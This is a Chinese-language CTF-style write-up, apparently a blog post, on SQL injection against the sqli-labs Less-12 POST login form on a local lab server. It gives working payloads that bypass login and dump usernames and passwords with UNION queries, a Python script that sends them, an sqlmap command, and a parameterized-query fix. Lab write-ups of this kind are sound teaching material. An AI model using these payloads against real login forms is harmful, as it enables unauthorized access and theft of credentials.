---
layout: post
title: sqli-labs - Less-12 POST 登录框注入（双引号+括号）Writeup
platform: sqli-labs
date: 2026-11-10 08:35:00 +0800
categories: CTF
---

sqli-labs - Less-12 POST 登录框注入（双引号+括号）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-12 → POST - Error Based - Double quotes - String with twist
- 地址：`http://127.0.0.1:8080/Less-12/`
- 题型：Web / SQL 注入
- 考点：**POST + 双引号 + 括号闭合 的登录框注入**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（secure_file_priv 已设为空，允许 outfile）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
uname=admin") #        → Your Login name:admin   ★ 绕过
uname=-1") union select 1,2 #  → Your Login name:1       （2 列）
uname=-1") union select 1,database() #  → login:1  pass:security
uname=-1") union select 1,group_concat(username,0x3a,password) from users #
                       → login:1  pass:Dumb:Dumb,...,admin:admin
```

二、题目分析

**① 源码：双引号 + 括号**

```php
$uname = $_POST['uname'];
$passwd = $_POST['passwd'];
$sql = "SELECT * FROM users WHERE username=(\"$uname\") AND password=(\"$passwd\") LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
if ($row) { echo "Your Login name:" . $row['username']; }
```

**★ 两个要点：**

```text
① 用的是双引号 "
② uname 外面套了括号 ("$uname")
→ 闭合要写 ")   —— 双引号 + 右括号
```

**② 和 Less-11 的关系**

| | Less-11 | Less-12 |
|---|---|---|
| 引号 | `'` | `"` |
| 括号 | 无 | 有 `("$uname")` |
| 闭合 | `'` | `")` |
| 打法 | 完全相同 | 完全相同 |

**③ 尝试顺序**

```text
Level 11 用过：admin' #
Level 12 要先试：
  admin' #    → 报错（引号不对）
  admin" #    → 报错（少括号）
  admin") #   → 成功 ★
```

三、解题步骤

**第一步：试闭合**

```text
uname = admin" #      → 报错（括号没闭合）
uname = admin") #     → Your Login name:admin  ★ 正确
```

**第二步：万能密码 / 逻辑真**

```text
uname = admin") #           → 登录成 admin
uname = admin") or 1=1 #    → 登录成第一行
```

**第三步：UNION 拿数据**

```text
uname = -1") union select 1,2 #
→ Your Login name:1      （2 列，两个显示位）

uname = -1") union select 1,database() #
→ login:1  pass:security

uname = -1") union select 1,group_concat(username,0x3a,password) from users #
→ login:1  pass:Dumb:Dumb,Angelina:I-kill-you,...,admin:admin
```

**第四步：脚本**

```python
import requests

url = "http://127.0.0.1:8080/Less-12/"

def login(uname, passwd="x"):
    return requests.post(url, data={"uname": uname, "passwd": passwd, "submit": "Submit"},
                         timeout=10).text

for p in ['admin") #',
          'admin") or 1=1 #',
          '-1") union select 1,database() #',
          '-1") union select 1,group_concat(username,0x3a,password) from users #']:
    print("=" * 50, "
", p)
    print(login(p)[:300])
```

**★ sqlmap 一条命令：**

```bash
sqlmap -u "http://127.0.0.1:8080/Less-12/" --data="uname=1&passwd=1&submit=Submit"        -p uname --batch --dbs
```

四、延伸知识

**① POST 关卡的通关思路（11~16 都一样）**

```text
① 抓包拿到参数名（uname / passwd / submit）
② 用单引号试错，看报错信息里的括号和引号
③ 闭合 + # 注释
④ UNION 或报错注入拿数据
```

**② 从报错信息反推闭合方式（最省事的技巧）**

```text
?id=1'   → 报错 near ''1'' LIMIT 0,1       ⇒ 单引号，无括号
?id=1')  → 报错 near ''1'') LIMIT 0,1      ⇒ 单引号 + 括号
?id=1"   → 报错 near '"1"" LIMIT 0,1       ⇒ 双引号，无括号
?id=1")  → 报错 near '"1"") LIMIT 0,1      ⇒ 双引号 + 括号
★ 报错里剩下的引号/括号，就是你要补的
```

**③ 登录框注入的修复**

```php
// 参数化 + 密码哈希 + 失败限制
$stmt = $pdo->prepare("SELECT id, username FROM users WHERE username=? AND password_hash=?");
$stmt->execute([$uname, password_hash($passwd, PASSWORD_DEFAULT)]);

if ($stmt->rowCount() === 1) { /* 登录成功 */ }
else { echo "用户名或密码错误"; }     // 统一提示
```

五、总结

- **本题核心：POST + 双引号 + 括号 → 闭合 `")` + `#` 注释。**

- 三步方法论：

```text
① 报错反推闭合：near '"1"")' → 双引号 + 括号 → 闭合用 ")
② 注释掉密码：admin") #
③ 要数据：-1") union select 1,database() #
```

- **三个必记要点**：

```text
① 报错信息里的引号/括号残留，就是闭合答案
② POST 注释用 #，别用 --+
③ -1 让主查询落空，UNION 显示位才有内容
```

- **实测数据**：

```text
admin") #   → Your Login name:admin
-1") union select 1,database() # → security
-1") union select 1,group_concat(username,0x3a,password) from users # → 8 个账号
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────────┐
│  Less-12 = Less-11 加一层括号：闭合从 ' 变成 ")                │
│                                                              │
│  报错反推口诀：                                               │
│      near ''1''       → '                                    │
│      near ''1'')      → ')                                   │
│      near '"1""       → "                                    │
│      near '"1"")      → ")   ★ Less-12 就是它                 │
│                                                              │
│  ★ 报错里剩什么，你就补什么                                    │
└──────────────────────────────────────────────────────────────┘
```
